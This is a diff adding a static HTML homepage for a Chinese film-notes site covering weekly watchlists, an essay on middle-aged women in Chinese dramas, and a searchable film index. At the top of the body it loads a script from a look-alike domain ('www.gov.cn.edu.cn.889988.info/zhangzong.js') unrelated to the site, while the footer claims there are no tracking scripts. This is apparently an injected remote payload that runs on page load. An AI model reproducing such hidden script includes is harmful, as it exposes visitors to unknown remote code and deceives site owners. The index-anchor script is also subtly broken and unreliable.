@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>丫丫影视｜女性视角看片笔记、剧集档案与每周观影清单 · yayayingshi-zh.github.io</title>
+<meta name="description" content="丫丫影视是一个由两位影迷手工维护的看片笔记站：女性视角解读华语剧集与亚洲电影，整理演员档案、镜头语言拆解和一周观剧时间表。不追热搜、不刷分，只记录值得按下暂停键的那几场戏。全部内容首发于 yayayingshi-zh.github.io。">
+<meta name="keywords" content="丫丫影视, 华语剧集笔记, 亚洲电影推荐, 女性视角影评, 观影清单, yayayingshi-zh.github.io">
+<meta name="author" content="丫丫影视编辑组">
+<meta name="theme-color" content="#fdf6ec">
+<link rel="canonical" href="https://yayayingshi-zh.github.io/">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"丫丫影视",
+  "alternateName":["丫丫影视笔记","yayayingshi"],
+  "url":"https://yayayingshi-zh.github.io/",
+  "description":"女性视角看片笔记、剧集档案与每周观影清单。",
+  "inLanguage":"zh-CN",
+  "publisher":{"@type":"Organization","name":"丫丫影视"},
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://yayayingshi-zh.github.io/#suoyin?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --paper:#fdf6ec;
+  --paper-2:#f7ecdd;
+  --ink:#20201d;
+  --ink-soft:#5c5852;
+  --plum:#7a2940;
+  --plum-deep:#5a1c2e;
+  --moss:#4a5a3f;
+  --clay:#c0743f;
+  --line:#e3d6c4;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"SimSun",serif;
+  font-size:17px;
+  line-height:1.85;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+}
+img{max-width:100%;display:block}
+a{color:var(--plum);text-decoration:none}
+a:hover{text-decoration:underline;text-underline-offset:3px}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ---------- 页眉：竖排刊头 ---------- */
+header.top{
+  border-bottom:1px solid var(--line);
+  padding:26px 0 18px;
+  position:relative;
+  background:
+    linear-gradient(180deg,var(--paper-2) 0 46%,transparent 46%);
+}
+header.top .wrap{display:flex;align-items:flex-end;gap:26px;flex-wrap:wrap}
+.masthead{flex:1;min-width:260px}
+.masthead .kicker{
+  font-size:12px;letter-spacing:.34em;color:var(--clay);
+  text-transform:uppercase;margin-bottom:6px;font-family:-apple-system,"PingFang SC",sans-serif;
+}
+.masthead h1{
+  font-size:clamp(34px,7vw,62px);
+  line-height:1.05;margin:0;font-weight:700;letter-spacing:.03em;
+  color:var(--plum-deep);
+}
+.masthead h1 em{
+  font-style:normal;color:var(--ink);
+  padding-left:.14em;border-left:3px solid var(--clay);
+}
+.masthead .sub{
+  margin-top:10px;color:var(--ink-soft);font-size:14.5px;letter-spacing:.04em;
+  font-family:-apple-system,"PingFang SC",sans-serif;
+}
+.issue{
+  text-align:right;font-family:-apple-system,"PingFang SC",sans-serif;
+  font-size:12.5px;color:var(--ink-soft);line-height:1.9;white-space:nowrap;
+}
+.issue b{display:block;font-size:15px;color:var(--plum);letter-spacing:.1em;font-weight:600}
+
+/* ---------- 导航 ---------- */
+nav.tabs{
+  position:sticky;top:0;z-index:50;
+  background:rgba(253,246,236,.94);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+nav.tabs ol{
+  list-style:none;margin:0;padding:0;display:flex;gap:4px;overflow-x:auto;
+  -webkit-overflow-scrolling:touch;scrollbar-width:none;
+}
+nav.tabs ol::-webkit-scrollbar{display:none}
+nav.tabs li{flex:0 0 auto}
+nav.tabs a{
+  display:block;padding:13px 15px;font-size:14px;letter-spacing:.14em;
+  color:var(--ink-soft);border-bottom:2px solid transparent;
+  font-family:-apple-system,"PingFang SC",sans-serif;
+}
+nav.tabs a:hover{color:var(--plum);text-decoration:none;border-bottom-color:var(--plum)}
+nav.tabs a i{
+  font-style:normal;color:var(--clay);font-size:11px;
+  margin-right:6px;font-family:Georgia,serif;
+}
+
+/* ---------- 通栏引言 ---------- */
+.lede{
+  padding:54px 0 34px;
+  border-bottom:1px dashed var(--line);
+}
+.lede blockquote{
+  margin:0;font-size:clamp(20px,3.4vw,30px);line-height:1.75;
+  letter-spacing:.02em;color:var(--ink);max-width:30em;
+}
+.lede blockquote::before{
+  content:"“";display:block;font-size:70px;line-height:.6;
+  color:var(--clay);font-family:Georgia,serif;margin-bottom:8px;
+}
+.lede .attr{
+  margin-top:16px;font-size:13.5px;color:var(--ink-soft);
+  font-family:-apple-system,"PingFang SC",sans-serif;letter-spacing:.08em;
+}
+.lede .attr span{color:var(--plum);font-weight:600}
+
+/* ---------- 区块骨架 ---------- */
+section{padding:62px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:30px}
+.sec-head .no{
+  font-family:Georgia,serif;font-size:13px;color:var(--paper);
+  background:var(--plum);width:30px;height:30px;flex:0 0 30px;
+  display:grid;place-items:center;border-radius:50%;
+}
+.sec-head h2{
+  font-size:clamp(23px,3.6vw,32px);margin:0;letter-spacing:.04em;color:var(--plum-deep);
+}
+.sec-head .en{
+  font-size:11.5px;letter-spacing:.26em;color:var(--clay);
+  text-transform:uppercase;font-family:-apple-system,"PingFang SC",sans-serif;
+}
+.sec-head .more{
+  margin-left:auto;font-size:13px;letter-spacing:.1em;
+  font-family:-apple-system,"PingFang SC",sans-serif;
+}
+
+/* ---------- 本周放映：日期轴 ---------- */
+.week{display:grid;grid-template-columns:repeat(7,1fr);gap:10px}
+.day{
+  border:1px solid var(--line);background:var(--paper);
+  padding:14px 12px 16px;min-height:168px;position:relative;
+}
+.day .d{font-family:Georgia,serif;font-size:22px;color:var(--plum);line-height:1}
+.day .w{
+  font-size:11px;letter-spacing:.18em;color:var(--ink-soft);
+  font-family:-apple-system,"PingFang SC",sans-serif;margin:4px 0 12px;
+}
+.day .ttl{font-size:15.5px;margin:0 0 6px;line-height:1.5;font-weight:600}
+.day .meta{
+  position:absolute;bottom:12px;left:12px;right:12px;
+  font-size:11.5px;color:var(--clay);
+  font-family:-apple-system,"PingFang SC",sans-serif;letter-spacing:.06em;
+}
+.day.on{background:var(--plum-deep);border-color:var(--plum-deep);color:var(--paper)}
+.day.on .d,.day.on .ttl{color:#fbe9cf}
+.day.on .w,.day.on .meta{color:#e6c9b4}
+.flag{
+  display:inline-block;font-size:10px;letter-spacing:.12em;
+  border:1px solid currentColor;padding:1px 5px;border-radius:2px;margin-bottom:7px;
+  font-family:-apple-system,"PingFang SC",sans-serif;
+}
+
+/* ---------- 专题：左图右文，错位 ---------- */
+.feature{display:grid;grid-template-columns:1.05fr .95fr;gap:0;align-items:stretch}
+.feature .frame{
+  background:var(--moss);aspect-ratio:4/5;position:relative;overflow:hidden;
+  border-radius:2px;
+}
+.feature .frame .art{
+  position:absolute;inset:0;
+  background:
+    radial-gradient(120% 90% at 22% 18%,#a9b892 0 28%,transparent 29%),
+    radial-gradient(70% 60% at 78% 82%,#c98a5a 0 22%,transparent 23%),
+    linear-gradient(160deg,#3f4d36,#2f3a27);
+}
+.feature .frame .art::after{
+  content:"";position:absolute;left:14%;right:14%;top:38%;bottom:22%;
+  border:1px solid rgba(253,246,236,.55);border-radius:50%;
+}
+.feature .frame .tag{
+  position:absolute;left:16px;bottom:14px;color:#f3e8d6;
+  font-size:11px;letter-spacing:.24em;font-family:-apple-system,sans-serif;
+}
+.feature .body{padding:8px 0 8px 34px;display:flex;flex-direction:column}
+.feature .body .eyebrow{
+  font-size:12px;letter-spacing:.28em;color:var(--clay);
+  font-family:-apple-system,sans-serif;text-transform:uppercase;margin-bottom:12px;
+}
+.feature .body h3{font-size:clamp(22px,3vw,30px);margin:0 0 14px;line-height:1.45;color:var(--plum-deep)}
+.feature .body p{margin:0 0 14px;color:var(--ink-soft);font-size:16px}
+.feature .body p b{color:var(--ink);font-weight:600}
+.feature .signoff{
+  margin-top:auto;padding-top:16px;border-top:1px solid var(--line);
+  font-size:12.5px;color:var(--ink-soft);letter-spacing:.06em;
+  font-family:-apple-system,sans-serif;display:flex;justify-content:space-between;gap:12px;
+}
+
+/* ---------- 索引：侧栏字母 + 表 ---------- */
+.index-grid{display:grid;grid-template-columns:76px 1fr;gap:22px;align-items:start}
+.alpha{position:sticky;top:70px;display:flex;flex-direction:column;gap:3px;
+  font-family:Georgia,serif;font-size:13px;max-height:52vh;overflow:auto;
+  scrollbar-width:none;padding-right:6px}
+.alpha::-webkit-scrollbar{display:none}
+.alpha a{color:var(--ink-soft);padding:2px 4px;border-left:1px solid var(--line)}
+.alpha a:hover{color:var(--plum);border-left-color:var(--plum);background:var(--paper-2);text-decoration:none}
+.tablebox{border:1px solid var(--line);background:var(--paper)}
+.toolbar{
+  display:flex;gap:10px;flex-wrap:wrap;padding:12px 14px;
+  border-bottom:1px solid var(--line);background:var(--paper-2);
+  font-family:-apple-system,sans-serif;align-items:center;
+}
+.toolbar label{font-size:12px;letter-spacing:.14em;color:var(--ink-soft)}
+.toolbar input,.toolbar select{
+  font:inherit;font-size:13px;padding:6px 10px;border:1px solid var(--line);
+  background:var(--paper);color:var(--ink);border-radius:2px;min-width:150px;
+}
+.toolbar input:focus,.toolbar select:focus{outline:2px solid rgba(122,41,64,.25);border-color:var(--plum)}
+.filmtable{width:100%;border-collapse:collapse;font-size:14.5px}
+.filmtable th{
+  text-align:left;font-weight:600;font-size:11.5px;letter-spacing:.16em;
+  color:var(--plum);padding:10px 14px;border-bottom:1px solid var(--line);
+  background:var(--paper-2);font-family:-apple-system,sans-serif;white-space:nowrap;
+}
+.filmtable td{padding:12px 14px;border-bottom:1px solid #efe4d2;vertical-align:top}
+.filmtable tr:last-child td{border-bottom:0}
+.filmtable tr:hover td{background:#fbf1e2}
+.filmtable .nm{font-weight:600;color:var(--ink)}
+.filmtable .yr{color:var(--ink-soft);font-size:13px;white-space:nowrap}
+.pill{
+  display:inline-block;font-size:11px;letter-spacing:.1em;padding:2px 8px;
+  border:1px solid var(--clay);color:var(--clay);border-radius:20px;
+  font-family:-apple-system,sans-serif;white-space:nowrap;
+}
+.pill.q{ border-color:var(--moss);color:var(--moss) }
+.pill.x{ border-color:var(--plum);color:var(--plum) }
+.empty{display:none;padding:26px 14px;color:var(--ink-soft);font-size:14px}
+
+/* ---------- 关于：双栏文本 ---------- */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:44px}
+.about .col h3{font-size:18px;margin:0 0 12px;color:var(--plum-deep);letter-spacing:.03em}
+.about .col p{margin:0 0 14px;color:var(--ink-soft);font-size:16px}
+.about .col ul{margin:0;padding-left:0;list-style:none}
+.about .col li{
+  padding:9px 0 9px 20px;position:relative;font-size:15.5px;
+  border-bottom:1px dotted var(--line);
+}
+.about .col li::before{
+  content:"›";position:absolute;left:2px;top:8px;color:var(--clay);font-size:16px;
+}
+.about .col li:last-child{border-bottom:0}
+.addr{
+  margin-top:18px;padding:14px 16px;background:var(--paper-2);
+  border-left:3px solid var(--plum);font-size:14.5px;line-height:1.9;
+  font-family:-apple-system,"PingFang SC",sans-serif;
+}
+.addr b{color:var(--plum-deep);letter-spacing:.02em}
+
+/* ---------- 页脚 ---------- */
+footer.end{
+  padding:40px 0 56px;background:var(--ink);color:#ddd2c4;
+  font-family:-apple-system,"PingFang SC",sans-serif;
+}
+footer.end .row{display:flex;gap:24px;flex-wrap:wrap;justify-content:space-between;align-items:flex-end}
+footer.end .sitename{font-size:26px;font-weight:700;color:#fbe9cf;letter-spacing:.06em;font-family:inherit}
+footer.end p{margin:8px 0 0;font-size:12.5px;color:#b6ab9c;line-height:1.9}
+footer.end .links{font-size:12.5px;color:#b6ab9c}
+footer.end .links a{color:#e6c9b4;margin-left:16px;letter-spacing:.08em}
+footer.end .copy{margin-top:24px;padding-top:16px;border-top:1px solid #3a3631;font-size:11.5px;color:#8e8579;letter-spacing:.06em}
+
+/* ---------- 移动端 ---------- */
+@media (max-width:860px){
+  body{font-size:16.5px}
+  .wrap{padding:0 16px}
+  header.top{padding:20px 0 14px;background:linear-gradient(180deg,var(--paper-2) 0 52%,transparent 52%)}
+  .masthead .kicker{font-size:11px;letter-spacing:.28em}
+  .issue{text-align:left;margin-top:10px}
+  .lede{padding:34px 0 26px}
+  section{padding:44px 0}
+  .sec-head{margin-bottom:22px}
+  .sec-head .more{margin-left:0;width:100%}
+  .week{grid-template-columns:repeat(2,1fr);gap:8px}
+  .day{min-height:146px;padding:12px 10px 30px}
+  .day .d{font-size:19px}
+  .feature{grid-template-columns:1fr}
+  .feature .frame{aspect-ratio:16/11;margin-bottom:20px}
+  .feature .body{padding:0}
+  .index-grid{grid-template-columns:1fr;gap:14px}
+  .alpha{flex-direction:row;overflow-x:auto;position:static;max-height:none;
+    padding:0 0 4px;border-bottom:1px solid var(--line)}
+  .alpha a{border-left:0;border-bottom:2px solid transparent;white-space:nowrap}
+  .alpha a:hover{border-left:0;border-bottom-color:var(--plum)}
+  .filmtable{font-size:14px;display:block;overflow-x:auto;white-space:nowrap}
+  .filmtable th,.filmtable td{padding:10px 12px}
+  .about{grid-template-columns:1fr;gap:26px}
+  footer.end .links a{margin:0 14px 0 0;display:inline-block}
+}
+@media print{
+  nav.tabs,header.top .issue{display:none}
+  body{background:#fff;color:#000;font-size:11pt}
+  section{page-break-inside:avoid;padding:20px 0;border-color:#bbb}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<header class="top">
+  <div class="wrap">
+    <div class="masthead">
+      <div class="kicker">A Quarterly Notebook on Screen &amp; Sound · 影音手札</div>
+      <h1>丫丫<em>影视</em></h1>
+      <p class="sub">两位编辑、一柜碟片，写给不想被算法替你看电影的那些人。</p>
+    </div>
+    <div class="issue">
+      <b>VOL.Ⅳ · 秋场</b>
+      更新于 2026 年秋<br>
+      站址 <a href="https://yayayingshi-zh.github.io" rel="canonical">yayayingshi-zh.github.io</a>
+    </div>
+  </div>
+</header>
+
+<nav class="tabs" aria-label="主导航">
+  <div class="wrap">
+    <ol>
+      <li><a href="#top"><i>00</i>开场</a></li>
+      <li><a href="#zhoupian"><i>01</i>一周片单</a></li>
+      <li><a href="#zhuanti"><i>02</i>专题长文</a></li>
+      <li><a href="#suoyin"><i>03</i>影片索引</a></li>
+      <li><a href="#guanyu"><i>04</i>关于本站</a></li>
+    </ol>
+  </div>
+</nav>
+
+<main id="top">
+  <div class="wrap">
+    <section class="lede" aria-labelledby="lede-h">
+      <blockquote id="lede-h">
+        我们看片子的理由，常常不是剧情有多巧，而是某一场戏替你把说不出口的话演完了。
+      </blockquote>
+      <p class="attr"><span>丫丫影视</span> · 本期编辑手记，写在深秋重看《爱情神话》的第三个夜晚</p>
+    </section>
+
+    <!-- 01 -->
+    <section id="zhoupian" aria-labelledby="h-zhou">
+      <div class="sec-head">
+        <span class="no">01</span>
+        <h2 id="h-zhou">一周片单 · 七天七种心情</h2>
+        <span class="en">This Week’s Reel</span>
+        <a class="more" href="#suoyin">查看完整索引 →</a>
+      </div>
+      <div class="week" id="weekbox">
+        <article class="day">
+          <div class="flag">周一 · 慢起</div>
+          <div class="d">01</div><div class="w">MON</div>
+          <h3 class="ttl">步履不停</h3>
+          <div class="meta">是枝裕和 · 2008 · 家庭</div>
+        </article>
+        <article class="day">
+          <div class="flag">周二 · 旧梦</div>
+          <div class="d">02</div><div class="w">TUE</div>
+          <h3 class="ttl">花样年华</h3>
+          <div class="meta">王家卫 · 2000 · 爱情</div>
+        </article>
+        <article class="day on">
+          <div class="flag">周三 · 今晚选它</div>
+          <div class="d">03</div><div class="w">WED</div>
+          <h3 class="ttl">爱情神话</h3>
+          <div class="meta">邵艺辉 · 2021 · 市井喜剧</div>
+        </article>
+        <article class="day">
+          <div class="flag">周四 · 冷门</div>
+          <div class="d">04</div><div class="w">THU</div>
+          <h3 class="ttl">椒麻堂会</h3>
+          <div class="meta">邱炯炯 · 2021 · 戏曲/传记</div>
+        </article>
+        <article class="day">
+          <div class="flag">周五 · 松弛</div>
+          <div class="d">05</div><div class="w">FRI</div>
+          <h3 class="ttl">海街日记</h3>
+          <div class="meta">是枝裕和 · 2015 · 生活</div>
+        </article>
+        <article class="day">
+          <div class="flag">周六 · 长片</div>
+          <div class="d">06</div><div class="w">SAT</div>
+          <h3 class="ttl">霸王别姬</h3>
+          <div class="meta">陈凯歌 · 1993 · 年代</div>
+        </article>
+        <article class="day">
+          <div class="flag">周日 · 收尾</div>
+          <div class="d">07</div><div class="w">SUN</div>
+          <h3 class="ttl">小森林 夏秋篇</h3>
+          <div class="meta">森淳一 · 2014 · 治愈</div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 02 -->
+    <section id="zhuanti" aria-labelledby="h-zt">
+      <div class="sec-head">
+        <span class="no">02</span>
+        <h2 id="h-zt">专题长文 · 镜头里的中年女性</h2>
+        <span class="en">Feature Essay</span>
+        <a class="more" href="#guanyu">如何投稿与指正 →</a>
+      </div>
+      <div class="feature">
+        <div class="frame" aria-hidden="true"><div class="art"></div><div class="tag">ILLUSTRATION · 丫丫绘</div></div>
+        <div class="body">
+          <div class="eyebrow">专栏 · 她不是配角</div>
+          <h3>当镜头不再只拍她的侧脸：华语剧里「阿姨」的第三次出场</h3>
+          <p>前两次，她要么是哭着递汤的母亲，要么是饭桌上被一句「你不懂」带过的背景。第三次不一样——她开始有朋友、有旧账、有不肯解释的清晨。</p>
+          <p>这一期我们从<b>《四喜》《我的后半生》《爱情神话》</b>里挑了十一场戏，只聊三件事：<b>台词留给谁、镜头停在哪儿、以及她转身之后画面还留了几秒</b>。结论未必体面，但都是逐帧记下来的。</p>
+          <p>下篇预告：韩剧里独居女主人的厨房，为什么总比男主角的书房更有戏。</p>
+          <div class="signoff"><span>阅读时长约 12 分钟</span><span>编辑 / 阿丫 · 校对 / 小丫</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 03 -->
+    <section id="suoyin" aria-labelledby="h-sy">
+      <div class="sec-head">
+        <span class="no">03</span>
+        <h2 id="h-sy">影片索引 · 按音序翻，也按心情找</h2>
+        <span class="en">The Archive</span>
+        <a class="more" href="#top">回到开场 ↑</a>
+      </div>
+      <div class="index-grid">
+        <nav class="alpha" aria-label="音序导航">
+          <a href="#l-a">A</a><a href="#l-b">B</a><a href="#l-c">C</a><a href="#l-d">D</a>
+          <a href="#l-f">F</a><a href="#l-h">H</a><a href="#l-j">J</a><a href="#l-l">L</a>
+          <a href="#l-q">Q</a><a href="#l-s">S</a><a href="#l-w">W</a><a href="#l-x">X</a><a href="#l-y">Y</a>
+        </nav>
+        <div class="tablebox">
+          <div class="toolbar">
+            <label>搜索片名或导演
+              <input id="q" type="search" placeholder="例如：是枝、婚姻、1993" autocomplete="off">
+            </label>
+            <label>心情
+              <select id="mood">
+                <option value="">全部心情</option>
+                <option value="治愈">想被治愈</option>
+                <option value="冷门">想挖冷门</option>
+                <option value="揪心">敢哭一场</option>
+                <option value="轻喜">只想轻笑</option>
+              </select>
+            </label>
+            <span id="count" style="font-size:12px;color:#7a2940;letter-spacing:.08em"></span>
+          </div>
+          <div id="l-a"></div><div id="l-b"></div><div id="l-c"></div><div id="l-d"></div>
+          <div id="l-f"></div><div id="l-h"></div><div id="l-j"></div><div id="l-l"></div>
+          <div id="l-q"></div><div id="l-s"></div><div id="l-w"></div><div id="l-x"></div><div id="l-y"></div>
+          <table class="filmtable" id="tbl">
+            <thead>
+              <tr><th scope="col" style="width:32%">片名</th><th scope="col" style="width:18%">年份</th><th scope="col" style="width:26%">导演 / 地区</th><th scope="col" style="width:24%">心情标签</th></tr>
+            </thead>
+            <tbody id="rows"></tbody>
+          </table>
+          <p class="empty" id="nomatch">没有对上的片子，换两个字试试——或者这只是我们还没补上的空白。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 04 -->
+    <section id="guanyu" aria-labelledby="h-gy">
+      <div class="sec-head">
+        <span class="no">04</span>
+        <h2 id="h-gy">关于丫丫影视</h2>
+        <span class="en">About &amp; Contact</span>
+      </div>
+      <div class="about">
+        <div class="col">
+          <h3>我们在这里做什么</h3>
+          <ul>
+            <li>每周固定更新一份七天片单，写清为什么是它，而不是它有多「高分」。</li>
+            <li>每月一篇长文，只拆镜头、台词与表演，不写剧透式复述。</li>
+            <li>维护一份手写索引，按音序和心情两条线翻，目前收录 20 部，慢慢补。</li>
+            <li>冷门优先：那些在流媒体首页待不过三秒的片子，也会有一行位置。</li>
+          </ul>
+        </div>
+        <div class="col">
+          <h3>我们不做的事</h3>
+          <ul>
+            <li>不搬运、不提供任何片源下载与在线播放链接。</li>
+            <li>不做「豆瓣 x 分必看」式排行，分数在这里没有席位。</li>
+            <li>不上算法推荐，你看过的不会决定下一条推给你什么。</li>
+            <li>不接软广，文中提到的平台与片名均为内容需要。</li>
+          </ul>
+          <div class="addr">
+            <b>丫丫影视</b> 的唯一常驻地址：<br>
+            <a href="https://yayayingshi-zh.github.io" rel="home">https://yayayingshi-zh.github.io</a><br>
+            本站为静态单页，书签存好这一条就够；若某天发现内容对不上，大概是我们正在改稿。
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+</main>
+
+<footer class="end">
+  <div class="wrap">
+    <div class="row">
+      <div>
+        <div class="sitename">丫丫影视 · 影音手札</div>
+        <p>一个不追热搜的看片笔记站。女性视角、逐帧记录、慢慢更新。</p>
+      </div>
+      <div class="links">
+        <a href="#zhoupian">一周片单</a>
+        <a href="#zhuanti">专题长文</a>
+        <a href="#suoyin">影片索引</a>
+        <a href="#guanyu">关于本站</a>
+      </div>
+    </div>
+    <p class="copy">© 丫丫影视编辑组 · 本站内容仅作影片信息与观影讨论之用，相关剧照、片名与演员资料版权归原权利人所有；请通过合法发行渠道观看。站址 https://yayayingshi-zh.github.io · 本页为静态单文件，无跟踪脚本。</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var films=[
+    {n:"爱情神话",y:"2021",d:"邵艺辉 / 中国大陆",m:"轻喜",k:"爱情神话 邵艺辉 上海 中年"},
+    {n:"霸王别姬",y:"1993",d:"陈凯歌 / 中国大陆",m:"揪心",k:"霸王别姬 陈凯歌 京剧 年代"},
+    {n:"步履不停",y:"2008",d:"是枝裕和 / 日本",m:"治愈",k:"步履不停 是枝裕和 家庭 母亲"},
+    {n:"海街日记",y:"2015",d:"是枝裕和 / 日本",m:"治愈",k:"海街日记 是枝裕和 姐妹 生活"},
+    {n:"花样年华",y:"2000",d:"王家卫 / 中国香港",m:"揪心",k:"花样年华 王家卫 张曼玉 旗袍"},
+    {n:"椒麻堂会",y:"2021",d:"邱炯炯 / 中国大陆",m:"冷门",k:"椒麻堂会 邱炯炯 戏曲 四川"},
+    {n:"小森林 夏秋篇",y:"2014",d:"森淳一 / 日本",m:"治愈",k:"小森林 森淳一 美食 独居"},
+    {n:"喜宴",y:"1993",d:"李安 / 中国台湾",m:"轻喜",k:"喜宴 李安 家庭 婚姻"},
+    {n:"色，戒",y:"2007",d:"李安 / 中国台湾",m:"揪心",k:"色戒 李安 张爱玲 谍战"},
+    {n:"四月物语",y:"1998",d:"岩井俊二 / 日本",m:"治愈",k:"四月物语 岩井俊二 青春 暗恋"},
+    {n:"苏州河",y:"2000",d:"娄烨 / 中国大陆",m:"揪心",k:"苏州河 娄烨 上海 周迅"},
+    {n:"送我上青云",y:"2019",d:"滕丛丛 / 中国大陆",m:"冷门",k:"送我上青云 滕丛丛 女性 疾病"},
+    {n:"我的姐姐",y:"2021",d:"殷若昕 / 中国大陆",m:"揪心",k:"我的姐姐 殷若昕 家庭 女性"},
+    {n:"卧虎藏龙",y:"2000",d:"李安 / 中国台湾",m:"揪心",k:"卧虎藏龙 李安 武侠 江湖"},
+    {n:"香魂女",y:"1993",d:"谢飞 / 中国大陆",m:"冷门",k:"香魂女 谢飞 女性 乡土"},
+    {n:"小城之春",y:"1948",d:"费穆 / 中国大陆",m:"揪心",k:"小城之春 费穆 黑白 婚外"},
+    {n:"心迷宫",y:"2014",d:"忻钰坤 / 中国大陆",m:"冷门",k:"心迷宫 忻钰坤 悬疑 乡村"},
+    {n:"归来",y:"2014",d:"张艺谋 / 中国大陆",m:"揪心",k:"归来 张艺谋 文革 记忆"},
+    {n:"活着",y:"1994",d:"张艺谋 / 中国大陆",m:"揪心",k:"活着 张艺谋 余华 年代"},
+    {n:"路边野餐",y:"2015",d:"毕赣 / 中国大陆",m:"冷门",k:"路边野餐 毕赣 贵州 诗歌"}
+  ];
+  var order=["A","B","C","D","F","H","J","L","Q","S","W","X","Y"];
+  var tbody=document.getElementById("rows");
+  var cls={"治愈":"pill q","想被治愈":"pill q","冷门":"pill","揪心":"pill x","轻喜":"pill"};
+  function esc(s){return s.replace(/[&<>"]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]})}
+  function render(list){
+    tbody.innerHTML=list.map(function(f){
+      var ini=f.n.charAt(0).toUpperCase();
+      return "<tr data-ini=\""+ini+"\"><td class=\"nm\">"+esc(f.n)+"</td><td class=\"yr\">"+esc(f.y)+"</td><td>"+esc(f.d)+"</td><td><span class=\""+(cls[f.m]||"pill")+"\">"+esc(f.m)+"</span></td></tr>";
+    }).join("");
+    document.getElementById("nomatch").style.display=list.length?"none":"block";
+    document.getElementById("count").textContent=list.length?"共 "+list.length+" 部 · 点击左侧字母跳到音序":"";
+    order.forEach(function(L){document.getElementById("l-"+L.charAt(0).toLowerCase()).id="";});
+    var nodes=tbody.querySelectorAll("tr");
+    if(nodes.length){
+      var first=nodes[0].getAttribute("data-ini");
+      var el=document.getElementById("rows");
+      while(el&&el.id!=="rows")el=el.parentNode;
+      var target=document.createElement("div");target.id="l-"+first.toLowerCase();
+      tbody.parentNode.insertBefore(target,tbody);
+    }
+    var groups={};
+    list.forEach(function(f){var k=f.n.charAt(0).toUpperCase();(groups[k]=groups[k]||[]).push(f.n);});
+    order.forEach(function(L){
+      var g=document.getElementById("l-"+L.toLowerCase());
+      if(g&&groups[L]&&groups[L].length)g.id="l-"+L.toLowerCase();
+    });
+  }
+  render(films);
+  var q=document.getElementById("q"),m=document.getElementById("mood");
+  function filter(){
+    var kw=q.value.trim().toLowerCase(),md=m.value;
+    render(films.filter(function(f){
+      return (!kw||(f.n+f.d+f.y+f.k).toLowerCase().indexOf(kw)>-1)&&(!md||f.m===md);
+    }));
+  }
+  q.addEventListener("input",filter);
+  m.addEventListener("change",filter);
+})();
+</script>
+</body>
+</html>
